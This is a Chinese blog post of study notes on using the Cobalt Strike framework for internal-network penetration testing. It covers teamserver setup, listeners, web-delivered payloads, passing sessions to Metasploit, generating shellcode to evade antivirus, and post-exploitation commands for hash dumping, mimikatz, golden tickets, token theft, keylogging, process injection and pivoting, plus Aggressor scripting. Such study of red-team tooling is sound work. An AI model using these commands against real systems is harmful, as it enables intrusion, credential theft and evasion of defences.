---
title: 内网之神器CS总结
tags:
  - 知识点总结
  - 内网
categories:
  - 知识点总结
  - 内网
description: 内网之神器CS总结
excerpt: 内网之神器CS总结
typora-root-url: 内网之神器CS总结
abbrlink: 4129
date: 2022-04-25 10:30:38
---

## 内网之神器CS使用指南

Cobalt Strike是一款非常成熟的渗透测试框架。在3.0之前基于MSF框架工作，可以使用MSF的漏洞库；自3.0后，CS不再使用MSF的漏洞库，成为一个独立的渗透测试平台。

CS使用Java编写，其有点是可进行团队协作，以一个Teamserver服务作为中转站，使目标系统权限反弹到该TeamServer服务器上；且CS提供了一个很好的UI界面。

### CS的安装

> Java环境的配置不做讲解

#### 部署TeamServer

CS的运行依赖于TeamServer，因此必须先搭建TeamServer。

解压并为可执行文件赋权：

```bash
sudo unzip -d /opt cobaltstrike4.0.zip
cd /opt/cobaltstrike4.0
sudo chmod +x teamserver start.sh
```

然后启动teamserver：

```bash
sudo ./teamserver 192.168.140.133 p@ssw0rdF0rCS
```

注意后面的：`p@ssw0rdF0rCS`是连接密码，部署至公网请务必使用强口令，至少应保证难以爆破。

#### 启动CS

```bash
./start.sh
```

这就可以启动CS了，此时填写对应消息，user可以随便填写，用于标识用户，但是不能重复。

连接时回要求确认指纹，以防止被篡改：

![image-20220425112954191](./image-20220425112954191.png)

如果无误则选择 YES，这样就进入了CS的主页面：

![image-20220425113035537](./image-20220425113035537.png)

#### 使用CS获取第一个Beacon

##### 建立Listener

如图，点击该按钮将显示`Listeners`页面：

![image-20220425113122658](./image-20220425113122658.png)

![image-20220425113150470](./image-20220425113150470.png)

然后添加一个Listener：

![image-20220425114025130](./image-20220425114025130.png)

##### Web Delivery执行Payload

`Attacks` => `Web Drive-By` => `Scripted Web Delivery`。

![image-20220425114204206](./image-20220425114204206.png)

选择刚刚建立的Listener，然后启动，成功会显示：

![image-20220425114320679](./image-20220425114320679.png)

复制该命令，然后在主机上执行，这样主机就上线了。

![image-20220425114357522](./image-20220425114357522.png)

##### 与主机交互

右击上线的主机，选择`Interact`选项进行交互即可：

![image-20220425114514216](./image-20220425114514216.png)

### CS 模块

#### Cobalt Strike模块

![image-20220425114558248](./image-20220425114558248.png)

* New Connection：连接到不同的团队服务器
* Preference：偏好设置等
* Visualization：将主机以不同的形式展示出来，可以在菜单下方快速切换
* VPN Interfaces：设置VPN接口
* Listeners：监听器
* Script Manager：查看和加载CNA脚本
* Close：关闭当前TeamServer连接

#### View模块

![image-20220425114804322](./image-20220425114804322.png)

* Applications：显示被控机器的应用信息
* Credentials：通过HashDump或mimikatz获取的密码或者散列值都存储在这
* Downloads：从被控机器下载的文件
* Event Log：主机上线记录，聊天记录、操作记录
* Keystrokes：键盘记录
* Proxy Pivots：代理模块
* Screenshots：屏幕截图
* Script Console：脚本控制台
* Targets：显示目标
* Web Log：Web访问日志

#### Attacks模块

![image-20220425114948089](./image-20220425114948089.png)

分上面三个，Packages中有：

* HTML Application：基于HTML应用的Payload模块，通过HTML调用其它语言的组件进行攻击，提供了可执行文件、Powershell、VBA三种方法
* MS Office Macro：Office宏病毒
* Payload Generator：Payload生成器，可以生成基于C、C#、COM Scriptlet、Java、Perl、Powershell、Python、Ruby、VBA等的Payload
* USB/CD AutoPlay：用于生成利用自动播放功能运行的后门
* Windows Dropper：捆绑器，对文档进行捆绑执行Payload
* Windows Executable：可以生成32位或64位和基于服务的EXE、DLL等后门程序；32位与64位需要仔细选择，尽量选择符合平台的架构的Payload，否则mimikatz等无法正常工作。
* Windows Executable(S)：用于生成Windows可执行文件，包含Beacon完整的Payload，不需要阶段性请求。相比上一模块，提供额外的代理设置，以便更好的渗透；还支持Powershell模块，可以将Stageless Payload注入内存。

Web Drive-by模块里有：

* Manage：管理器，用于对TeamServer上已经开启的Web服务进行管理，包括Listener及Web Delivery模块
* Clone Site：用于克隆指定网站的样式
* Host File：用于将指定文件加载到Web目录中，支持修改Mime Type
* Script Web Delivery： 基于Web的攻击测试脚本，自动生成可执行的Payload
* Smart Applet Attack：自动检测Java的版本并进行跨平台和跨浏览器的攻击测试。可利用版本为Java 1.6.0_45以下及1.7.0_21以下。
* System Profiler：客户端检测攻击，可以用来获取一些系统信息，例如系统版本、浏览器版本、Flash版本等。

#### Reporting模块

![image-20220425115834200](./image-20220425115834200.png)

主要用于报告生成，还没需要用到这一部分，跳过。

### CS 功能详解

#### 监听模块

##### Listeners模块Payload功能详解

所有的Payload如表：

|              Payload               |                        说明                        |
| :--------------------------------: | :------------------------------------------------: |
| windows/beacon_dns/reverse_dns_txt | 使用DNS中的TXT类型进行数据传输，对目标主机进行管理 |
|  windows/beacon_dns/reverse_http   |          采用DNS的方式对目标主机进行管理           |
|  windows/beacon_http/reverse_http  |                      反向HTTP                      |
| windows/beacon_https/reverse_https |          采用SSL进行加密，有较高的隐蔽性           |
|    windows/beacon_smb/bind_pipe    |      Cobalt Strike的SMB Beacon，仅限于x64主机      |
|    windows/foreign/reverse_http    |                   会话派生给MSF                    |
|   windows/foreign/reverese_https   |                  SSL会话派生给MSF                  |
|    windows/foreign/reverse_tcp     |                  TCP会话派生给MSF                  |

##### 监听器简约说明

在Listeners中直接添加即可创建监听器，不像书上所说的那样每种监听器只能创建一个，可以创建多个。

书上这点说反了，不是说Foreign可以让MSF反弹给CS，而是如果监听器类型为Beacon，则为CS的监听器，也可以接受MSF的会话，如果为Foreign，则表示将Beacon会话反弹给MSF或者其它。

#### 监听器的创建与使用 - 会话派生

##### 创建外置监听器

创建一个名为`CS2MSF`的监听器：

![image-20220425145437544](./image-20220425145437544.png)

##### MSF启动监听

在MSF中启动监听：

```bash
msf-pro > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf-pro exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf-pro exploit(multi/handler) > set LPORT 20333
LPORT => 20333
msf-pro exploit(multi/handler) > set lhost 192.168.140.133
lhost => 192.168.140.133
msf-pro exploit(multi/handler) > run

[*] Started HTTP reverse handler on http://192.168.140.133:20333

```

##### CS派生

接下来在CS中派生会话，在Beacon中输入：

```powershell
spawn CS2MSF
```

或者右击被控主机，点击`Spawn`：

![image-20220425145953676](./image-20220425145953676.png)

选择`CS2MSF`即可。

则在MSF中应该收到：

```powershell
[*] http://192.168.140.133:20333 handling request from 192.168.140.132; (UUID: mcbbkmw8) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 1 opened (192.168.140.133:20333 -> 127.0.0.1 ) at 2022-04-25 02:57:09 -0400

meterpreter >
```

#### Delivery模块

主要了解的是`Scripted Web Delivery`模块。

![image-20220425150132991](./image-20220425150132991.png)

* URI Path：在访问URL时，Payload的位置
* Local Host：TeamServer服务器的地址
* Local Port：TeamServer服务器开启的端口，可以与Beacon Listener端口重复
* Listener：接受会话的监听器
* Type：类型，可以选`bitsadmin`、`powershell`、`python`

点击Launch后，CS会提供一个命令，如果忘记可以打开Manage页面，copy URL即可复制命令。

#### Manage模块

`Attacks` => `Web Drive-By` => `Manage`，可以看到开启的服务：

![image-20220425150727519](./image-20220425150727519.png)

主要用于管理团队服务器的Web服务，当然其中还有Beacon监听器。

#### Payload模块

##### Payload的生成

`Attacks` => `Packages` => `Payload Generator`，就可以打开：

![image-20220425150900703](./image-20220425150900703.png)

可以生成多种CS的Shellcode，选择好监听器以及输出语言的格式，就可以生成对应语言的ShellCode。这个模块主要是对抗杀毒的，复制ShellCode，然后自己进行混淆等，绕过杀毒软件，进行免杀处理。

##### Windows可执行文件(EXE、Stageless)的生成

这里生成EXE没啥可讲的，但是注意，如果没有使用脚本进行免杀处理的话，这里生成的EXE 100%会被查杀。

#### 后渗透测试模块

##### 简介

这里主要适用于信息收集、权限提升、端口扫描、端口转发、横向移动、持久化等操作。

##### 使用Elevate模块提升Beacon的权限

查看当前权限：

![image-20220425152040195](./image-20220425152040195.png)

发现是普通用户，提权：

![image-20220425152130477](./image-20220425152130477.png)

选择适合的提权方式：

![image-20220425152228093](./image-20220425152228093.png)

就可以接收到一个新的Beacon：

![image-20220425152349460](./image-20220425152349460.png)

但是还是没有到系统权限，此时通过该Beacon再选择合适的提权方式即可提权到SYSTEM：

![image-20220425152412322](./image-20220425152412322.png)

##### 通过CS利用Golden Ticket提升至域管权限

在得到黄金票据所需要的信息后，就可以制造黄金票据并获得相应的权限。

右键Beacon，`Access` => `Golden Ticket`，输入对应的信息：

![image-20220425152558851](./image-20220425152558851.png)

如果制造黄金票据成功的话，CS就会自动导入内存，此时就拥有了域管权限。

##### 使用make_token模块模拟指定用户

右击一个Beacon，`Access` => `Make_token`，当然在命令行中输入`make_token DOMAIN\user password`也是可以的。

![image-20220425152835774](./image-20220425152835774.png)

##### 使用Dump Hashes模块导出散列值

右击，`Access` => `Dump Hashed`或者Beacon中输入`hashdump`即可：

![image-20220425152932223](./image-20220425152932223.png)

使用该命令导出的哈希值会被记录到`View` => `Credentials`中。

如果在域控进行该操作，会导出域内所有用户的密码散列值。

##### logonpasswords模块

选择Beacon右键，`Access` => `Run Mimikatz`，或者在Beacon中输入`logonpasswords`：

![image-20220425153132857](./image-20220425153132857.png)

##### mimikatz模块

在Beacon中可以直接调用mimikatz模块：

```bash
mimikatz [module::command] <args>
mimikatz [!module::command] <args>
mimikatz [@module::command] <args>
```

##### PsExec模块

调用了mimikatz的PTH模块，必须为管理员权限。

方法简单，选中对应的Credential和合适的Listener即可，不做说明。

##### SOCKS Server模块

右击一个主机，选择`Pivoting` => `SOCKS Server`选项，或者在Beacon中执行`socks [stop|port]`，即可调用SOCKS Server模块。

输入`socks stop`可以停止当前Beacon的全部SOCKS代理，可以通过`View` => `Proxy Pivots`查看SOCKS代理。

SOCKS代理使用的方式很多，例如直接在浏览器中添加SOCKS代理，注意是SOCKS4版本的代理。

第二种是直接查看SOCKS代理，选择Tunnel按钮，复制到MSF中，这样就可以让MSF的流量走SOCKS代理。

在Windows中 ，可以使用SocksCap64、Linux中可以使用proxychains、sSocks等。

##### rportfwd模块

在Beacon命令行中执行命令，启动rportfwd模块：

```bash
rportfwd [bind port] [forward host] [forwar port]
rportfwd stop [bind port]
```

如果无法正向连接指定端口，可以使用端口转发将被控机器的本地端口转发到公网VPS上，或者转发到团队服务器的指定端口上。

##### 级联监听器模块

选择`Pivoting` => `Listener`，即可调用级联监听器模块，实际上只是将端口转发模块和监听器模块组合起来。

创建后，实际在Beacon中执行了：

![image-20220425155203809](./image-20220425155203809.png)

##### 使用spawnas模块派生指定用户身份的Shell

`Access` => `Spawn As`选项，或者在Beacon中执行`spawnas DOMAIN\user password listener`。

##### 通过Spawn获取新会话

直接`spawn`到一个存在的监听器会创建一个新的Beacon，如果`spawn`到MSF则会派生到MSF中。

> 每次`Spawn`都会启动一个新进程，进程为rundll32.exe

### CS的常见命令

#### CS的基本命令

下面没有给指令格式的都是命令，直接使用。

##### help

可以将beacon的命令和用法都列出来，查看指定命令可以`help command`指定

##### sleep

指令格式：`sleep seconds`

调整回连时间间隔，如调整为一秒`sleep 1`，如果调整为`sleep 0`就是交互模式了。

##### getuid

获取当前Beacon的用户信息，是否有管理员权限等

##### getsystem

类似MSF的自动提权，尝试性的。

拿到的System权限实际是第二高权限，TrustedInstaller权限是最高权限。

##### getprivs

用于获取当前Beacon包含的所有权限，类似于`whoami /priv`

##### browserpivot

指令格式：`browserpivot pid x86|x64`或者`browserpivot stop`

用于劫持IE浏览器，本地浏览器通过代理劫持的目标的Cookie实现免密登录。

##### desktop

指令格式：`desktop`或`desktop high|low`

使用普通用户权限运行此模块，可以拿到目标主机的桌面。

![image-20220425160431211](./image-20220425160431211.png)

##### 文件操作

图形化可以右击主机，`Explore` => `File Browser`

命令：

* cd 切换文件夹
* ls 列出目录
* downlaod 下载文件
* upload 上传文件
* execute 执行文件
* mv 移动文件
* mkdir 创建文件夹
* delete 删除文件或文件夹

##### new view

指令格式：`new view <Domain>`或`net computers|dclist|domain_trusts|group|localgroup|logons|sessions|share|user|time`

功能类似于Windows的Net命令。

##### portscan

指令格式：`portscan target ports art|icmp|none max_connections`

不推荐图形化，图形化无法指定ip端。

##### 进程控制

命令：`ps`或`kill pid`

查看进程或结束进程。

##### screenshot

获取目标主机用户的桌面截图。

定时截图使用：`screenshot pid <x86|x64> seconds`

##### Log Keystrokes模块

图形化选择`Process List` => `Log KeyStrokes`

命令行：`kerlogger pid <x86|x64>`

在`View` => `Log KeyStrokes`中查看。

> 信了书上的邪，使用普通用户一直无法成功，使用System权限一把成功。

##### inject

将Payload注入进程，回弹一个Beacon。

在Process List中选择进程，执行Inject或者命令行：

```bash
inject pid <x86|x64> listener
```

##### Steal Token

在Process List中选择Steal Token或者命令行：

```bash
steal_token pid
```

还原令牌：

```bash
rev2self
```

##### note模块

图形化：右键，`Sessions` => `Note`

命令行：`note text`

用于标记机器

##### exit

用于退出Beacon会话。

##### remove模块

长时间没有回连挥着不需要使用，就可以移出会话列表。

##### shell

指令格式：`shell command args`

指明命令，调用的cmd.exe

##### run

指令格式：`run program args`

不是调用cmd.exe而是直接调用能够找到的程序（Path里的）。

```bash
run cmd ipconfig
```

实际和`shell ipconfig`一致，但是`run ipconfig`则不同，这是直接调用的`ipconfig.exe`。

##### execute

指令格式：`execute program args`

用于后台运行，无回显。

##### powershell

指令格式：`powershell commandlet args`

通过powershell.exe执行命令

##### powerpick

指令格式：`powerpick commandlet args`

不通过Powershell.exe执行，非托管Powershell技术。

##### powershell-import

指令格式：`powershell-import module`

可以直接将本地的模块加载到远程系统的内存中，然后使用`powershell`指令执行。

### Aggressor脚本的编写

常用于拓展CS的功能。

采用Sleep语言，官方地址：[Sleep 2.1 Manual (dashnine.org)](http://sleep.dashnine.org/manual/index.html)

#### 语言基础

##### 变量

类似于PHP，但是语法更为严格：

```php
$x = 1 + 2;
```

注意`=`两边都需要添加空格。

##### 数组

1. 定义数组

   第一种方式：

   ```php
   @foo[0] = "Raphael";
   @foo[1] = 42.5;
   ```

   第二种：

   ```php
   @array = @("a", "b", "c", "d", "e");
   ```

   可以看到，数组必须使用`@`符号。

2. 数组增加

   ```php
   @a = @(1, 2, 3);
   @b = @(4, 5, 6);
   (@a) += @b;
   add(@a, 7, -1)
   ```

3. 数组访问

   ```php
   @array = @("a", "b", "c", "d", "e");
   println(@array[-1]);
   ```

##### 哈希表

1. 定义哈希表

   使用`%`开头，使用`=>`连接（PHP实锤0.0）：

   ```php
   %random = %(a => "apple", b => "boy", c => "cat", d => "dog");
   ```

2. 访问哈希表

   ```php
   println(%random["a"])
   ```

##### 注释

`#`符开头，行尾结束

##### 比较运算符

* eq：等于
* ne：不等于
* lt：小于
* gt：大于
* isin：一个字符串是否包含另一个字符串
* iswm：一个字符串使用通配符匹配另一个字符串
* =~：数组比较
* is：引用是否相等

##### 条件判断

```python
if (v1 operator v2)
{
    # code to execute
}
else if (-operator v3)
{
    #...
}
else
{
    # do this if nothing above it is true
}
```

##### 循环

1. for循环

   ```c++
   for (initialization; comparison; increment) { code }
   ```

2. while循环

   ```c++
   while variable (expression) { code }
   ```

3. foreach循环

   ```java
   foreach index => value (source) { code }
   ```

##### 函数

使用`sub`关键字声明。

参数标记为`$1`、`$2`...

变量`@_`是一个包含所有参数的数组，改变`$1`、`$2`等回改变`@_`的内容。

1. 函数定义

   ```java
   sub addTwoValues {
       return $1 + $2;
   }
   ```

2. 函数调用

   ```powershell
   addTwoValues("3", 55.0);
   ```

   输出为数字58.

##### 定义弹出式菜单

弹出式菜单的关键字为`popup`；

定义Cobalt Strike帮助菜单的代码如下：

```java
popup help {
    item("&Homepage", {url_open("<https://www.cobaltstrike.com/>");});
    item("&Support", {url_open("<https://www.cobaltstrike.com/support>");});
    item("&Arsenal", {url_open("<https://www.cobaltstrike.com/scripts?license=>" . licenseKey());});
    separator();
    item("&System Information", { openSystemInformationDialog(); });
    separator();
    item("&About", { openAboutDialog(); });
}
```

##### 定义alias关键字

可以使用alias关键字定义信的Beacon命令：

```java
alias hello {
    blog($1, "Hello World!");
}
```

`blog`函数表示将结果输出到Beacon控制台。

##### 注册Beacon命令

通过beacon_command_register函数注册Beacon命令：

```java
alias echo {
    blog($1, "You typed: " . substr($1, 5));
}
beacon_command_register(
    "echo",
    "echo text to beacon log",
    "Synopsis: echo [arguments]\n\nLog arguments to the beacon console"
);
```

##### bpowershell_import函数

该函数用于将Powershell脚本导入Beacon：

```java
alias powerup {
    bpowershell_import($1, script_resource("PowerUp.ps1"));
    bpowershell($1, "Invoke-AllChecks")
}
```

在上面的代码中，bpowershell函数运行了由bpowershell_import函数导入的PowerShell函数。

深入了解可以去学习一下Sleep。

#### 加载Aggressor脚本

加载可以在CS的脚本管理解密点击`Load`按钮，加载后缀为`.can`的脚本。

需要长期运行的脚本，可以执行：

```bash
./agscript host port user password scripath
```



> 内网攻防实践这本书读到这里也就结束了。

